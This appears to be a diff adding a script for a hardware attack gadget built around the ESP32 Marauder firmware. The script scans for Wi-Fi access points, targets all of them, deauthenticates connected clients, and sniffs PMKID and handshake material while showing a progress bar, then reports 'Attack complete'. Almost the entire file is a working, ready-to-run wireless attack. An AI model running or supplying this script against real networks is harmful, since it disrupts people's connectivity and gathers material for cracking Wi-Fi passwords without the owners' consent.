@@ -1,0 +1,50 @@
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Press button to start
+WAIT_FOR_BUTTON_PRESS
+
+WEB_OFF
+
+REM First we need to get a list of APs to target
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Scanning for APs (20s)
+ESP32M scanap
+DELAY 20000
+ESP32M stopscan
+DISPLAY_TEXT 0 10 Scan finished
+
+REM Next we can deauth anything connected to the AP and sniff the crypto handshakes
+DISPLAY_TEXT 0 20 Deauthing!
+REM https://github.com/justcallmekoko/ESP32Marauder/wiki/sniffpmkid
+ESP32M select -a all
+ESP32M sniffpmkid -l -d
+DISPLAY_TEXT 0 40 Long press to stop
+
+VAR $SCREEN_X_POS = 0
+
+WHILE (TRUE)
+    REM The following prints a little status bar for every packet recieved
+    IF (ESP32M_GET_RECV_PACKETS() != 0)
+        DISPLAY_TEXT $SCREEN_X_POS 50 .
+        $SCREEN_X_POS = ( $SCREEN_X_POS + 1 )
+        IF ($SCREEN_X_POS >= #_DISPLAY_WIDTH_)
+            DISPLAY_CLEAR
+            DISPLAY_TEXT 0 0 Scanning for APs (20s)
+            DISPLAY_TEXT 0 10 Scan finished
+            DISPLAY_TEXT 0 20 Deauthing!
+            DISPLAY_TEXT 0 40 Long press to stop
+            $SCREEN_X_POS = 0
+        END_IF
+    END_IF
+
+    WAIT_FOR_BUTTON_PRESS_OR_TIMEOUT 1000
+
+    IF (BUTTON_LONG_PRESS())
+        DISPLAY_CLEAR
+        ESP32M stopscan
+
+        DISPLAY_TEXT 0 0 Attack complete
+        DISPLAY_TEXT 0 10 Press again to reset
+        WAIT_FOR_BUTTON_PRESS
+        RESET
+    END_IF
+END_WHILE
